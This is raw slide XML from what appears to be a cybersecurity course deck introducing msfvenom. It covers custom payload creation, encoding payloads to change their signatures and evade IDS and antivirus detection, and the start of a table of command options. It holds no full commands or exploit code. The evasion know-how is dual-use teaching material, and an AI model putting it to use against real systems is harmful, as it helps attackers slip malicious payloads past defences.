          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="336050" y="171925"/>
            <a:ext cx="8535600" cy="8484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b="0" lang="en" sz="2200"/>
              <a:t>In order to create these payloads, attackers use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2500">
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en" sz="2200"/>
              <a:t>, a Metasploit framework tool that generates and encodes payloads.</a:t>
            </a:r>
            <a:endParaRPr b="0" sz="2200"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="499" name="Google Shape;499;p69"/>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500" name="Google Shape;500;p69"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1887625" y="4115513"/>
            <a:ext cx="6282000" cy="621300"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 16667" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="91425" lIns="18287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
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Although</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata ExtraBold"/>
                <a:ea typeface="Inconsolata ExtraBold"/>
                <a:cs typeface="Inconsolata ExtraBold"/>
                <a:sym typeface="Inconsolata ExtraBold"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> is part of the Metasploit framework,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Metasploit does not need to be running in order to use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1700">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata ExtraBold"/>
                <a:ea typeface="Inconsolata ExtraBold"/>
                <a:cs typeface="Inconsolata ExtraBold"/>
                <a:sym typeface="Inconsolata ExtraBold"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="501" name="Google Shape;501;p69"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="794775" y="3907687"/>
            <a:ext cx="996449" cy="996449"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="502" name="Google Shape;502;p69"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="237925" y="1115179"/>
            <a:ext cx="8668500" cy="264870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6" name="Shape 506"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="507" name="Google Shape;507;p70"/>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508" name="Google Shape;508;p70"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="665375" y="3538850"/>
            <a:ext cx="7301700" cy="5121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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="509" name="Google Shape;509;p70"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="399658" y="3521018"/>
            <a:ext cx="548700" cy="548700"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FCB91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rgbClr val="082D49"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:srgbClr val="082D49"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="510" name="Google Shape;510;p70"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="665375" y="2685350"/>
            <a:ext cx="7301700" cy="5121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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="511" name="Google Shape;511;p70"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="399658" y="2667518"/>
            <a:ext cx="548700" cy="548700"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FCB91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rgbClr val="082D49"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:srgbClr val="082D49"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="512" name="Google Shape;512;p70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1075825" y="2726300"/>
            <a:ext cx="6112500" cy="431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solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>It changes the signature of an exploit or payload, creating a new signature that has no written rule.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="513" name="Google Shape;513;p70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1075825" y="3579825"/>
            <a:ext cx="6515700" cy="431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solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>This change in signature allows payloads to bypass detection from IDS and AV tools that detect known malicious signatures.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="514" name="Google Shape;514;p70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="667512"/>
            <a:ext cx="8262900" cy="7803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1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>While it’s relatively simple to create a custom payload, the challenge is creating a payload that bypasses network detection by IDS and AV solutions.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="515" name="Google Shape;515;p70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="336059" y="171916"/>
            <a:ext cx="9144000" cy="3936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a:t>Intro to </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en" sz="2800">
                <a:latin typeface="Inconsolata ExtraBold"/>
                <a:ea typeface="Inconsolata ExtraBold"/>
                <a:cs typeface="Inconsolata ExtraBold"/>
                <a:sym typeface="Inconsolata ExtraBold"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:endParaRPr b="0" sz="2800">
              <a:latin typeface="Inconsolata ExtraBold"/>
              <a:ea typeface="Inconsolata ExtraBold"/>
              <a:cs typeface="Inconsolata ExtraBold"/>
              <a:sym typeface="Inconsolata ExtraBold"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="516" name="Google Shape;516;p70"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="665375" y="1814025"/>
            <a:ext cx="7301700" cy="5121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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="517" name="Google Shape;517;p70"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="399658" y="1796193"/>
            <a:ext cx="548700" cy="548700"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FCB91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rgbClr val="082D49"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:srgbClr val="082D49"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="518" name="Google Shape;518;p70"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1075825" y="1955650"/>
            <a:ext cx="6553800" cy="229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solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Encoding is one method used to evade detection tools.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>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22" name="Shape 522"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="523" name="Google Shape;523;p71"/>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524" name="Google Shape;524;p71"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3731050" y="1119050"/>
            <a:ext cx="1681800" cy="1681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71"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="2920725"/>
            <a:ext cx="8520600" cy="75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4000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Instructor Demonstration</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="526" name="Google Shape;526;p71"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3985781" y="1583750"/>
            <a:ext cx="1172338" cy="752400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="527" name="Google Shape;527;p71"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="3514625"/>
            <a:ext cx="9144000" cy="914700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en" sz="2400">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Custom payload creation with </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata ExtraBold"/>
                <a:ea typeface="Inconsolata ExtraBold"/>
                <a:cs typeface="Inconsolata ExtraBold"/>
                <a:sym typeface="Inconsolata ExtraBold"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:endParaRPr b="0">
              <a:solidFill>
                <a:schemeClr val="accent2"/>
              </a:solidFill>
              <a:latin typeface="Inconsolata ExtraBold"/>
              <a:ea typeface="Inconsolata ExtraBold"/>
              <a:cs typeface="Inconsolata ExtraBold"/>
              <a:sym typeface="Inconsolata ExtraBo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1" name="Shape 531"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="532" name="Google Shape;532;p72"/>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533" name="Google Shape;533;p72"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="82300" y="657741"/>
            <a:ext cx="8262900" cy="5130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1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>The most important </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="dk2"/>
                </a:highlight>
                <a:latin typeface="Inconsolata ExtraBold"/>
                <a:ea typeface="Inconsolata ExtraBold"/>
                <a:cs typeface="Inconsolata ExtraBold"/>
                <a:sym typeface="Inconsolata ExtraBold"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> command options include:</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="534" name="Google Shape;534;p72"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="336059" y="171916"/>
            <a:ext cx="9144000" cy="3936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a:t>Custom Payload Creation with </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en" sz="2800">
                <a:latin typeface="Inconsolata ExtraBold"/>
                <a:ea typeface="Inconsolata ExtraBold"/>
                <a:cs typeface="Inconsolata ExtraBold"/>
                <a:sym typeface="Inconsolata ExtraBold"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:endParaRPr b="0" sz="2800">
              <a:latin typeface="Inconsolata ExtraBold"/>
              <a:ea typeface="Inconsolata ExtraBold"/>
              <a:cs typeface="Inconsolata ExtraBold"/>
              <a:sym typeface="Inconsolata ExtraBold"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="535" name="Google Shape;535;p72"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="509863" y="1262958"/>
          <a:ext cx="3000000" cy="3000000"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:noFill/>
                <a:tableStyleId>{6612969B-C513-441B-A60A-CB1CB7D8F428}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="945125"/>
                <a:gridCol w="6922300"/>
              </a:tblGrid>
              <a:tr h="479275">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>-p:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700"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800">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Metasploit payload we want to use</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="0" marB="0" marR="0" marL="18287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r>
              <a:tr h="483600">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>-e:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700"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lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Encoder we want to use</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="0" marB="0" marR="91425" marL="18287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FFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="483600">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>-a:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700"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lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Architecture we want to use (the default is x86)</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="0" marB="0" marR="91425" marL="18287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r>
              <a:tr h="479275">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>-s:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700"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lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
